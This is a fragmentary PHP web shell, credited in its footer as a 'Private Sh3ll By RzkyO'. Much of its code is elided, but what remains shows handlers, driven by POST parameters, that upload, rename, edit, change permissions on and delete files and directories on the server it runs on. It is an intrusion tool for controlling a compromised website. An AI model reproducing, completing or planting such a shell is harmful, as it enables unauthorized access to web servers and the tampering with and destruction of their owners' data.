...
echo '<br><br><font color="white">UPLOAD SUCCESS</font><br/>';
}else{
...
echo '<br><br><font color="white">CHANGE PERMISSION SUCCESS</font><br/>';
}else{
...
echo '<br><br><font color="white">CHANGE NAME SUCCESS</font><br/>';
}else{
...
echo '<br><br><font color="white">EDIT FILE SUCCESS</font><br/>';
}else{
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="white">DELETE DIR SUCCESS</font><br/>';
}else{
...
echo '<br><br><font color="white">DELETE FILE SUCCESS</font><br/>';
}else{
...
<center>
<br>
<font size="2px" color="white">Copyright &#169; <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear()); </script> PDI Perjuangan Private Sh3ll By RzkyO</font>
</center>
</BODY>
</HTML>
